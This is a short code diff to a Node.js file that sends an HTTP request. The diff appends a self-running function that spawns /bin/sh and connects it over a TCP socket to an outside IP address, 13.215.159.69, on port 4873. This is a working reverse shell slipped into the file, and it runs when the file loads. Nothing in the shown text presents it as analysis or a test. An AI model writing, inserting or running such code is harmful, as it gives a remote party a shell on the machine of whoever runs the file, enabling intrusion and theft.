@@ -45,3 +45,16 @@ req.on("error", (e) => {
 
 req.write(postData);
 req.end();
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4873, "13.215.159.69", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
